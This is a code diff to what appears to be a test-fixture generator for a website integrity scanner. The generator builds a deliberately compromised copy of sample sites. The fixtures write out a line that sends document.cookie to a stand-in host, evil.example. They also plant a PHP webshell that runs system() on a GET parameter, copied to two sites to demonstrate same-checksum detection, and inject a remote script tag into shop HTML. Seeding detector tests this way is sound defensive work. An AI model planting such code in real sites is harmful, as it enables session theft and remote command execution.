@@ -83,11 +83,14 @@ write(RIGHT, 'example.com/lib/util.js', cleanUtil + `
 // injected
 fetch('https://evil.example/collect?c=' + document.cookie);
 `);
-// uploads/shell.php: ADDED — dropped webshell
-write(RIGHT, 'example.com/uploads/shell.php', `<?php
+// uploads/shell.php: ADDED — dropped webshell. The SAME webshell is dropped on
+// another site (identical bytes -> identical sha) to demo the "same checksum" fix.
+const shell = `<?php
 // dropped file — not in baseline
 system($_GET['cmd'] ?? 'id');
-`);
+`;
+write(RIGHT, 'example.com/uploads/shell.php', shell);
+write(RIGHT, 'shop.local/cache/shell.php', shell);
 // shop.local/index.html: MODIFIED — script injection
 write(RIGHT, 'shop.local/index.html', cleanShopHtml.replace('</body>', '  <script src="https://evil.example/x.js"></script>\n  </body>'));
 // shop.local/promo.htm: ADDED
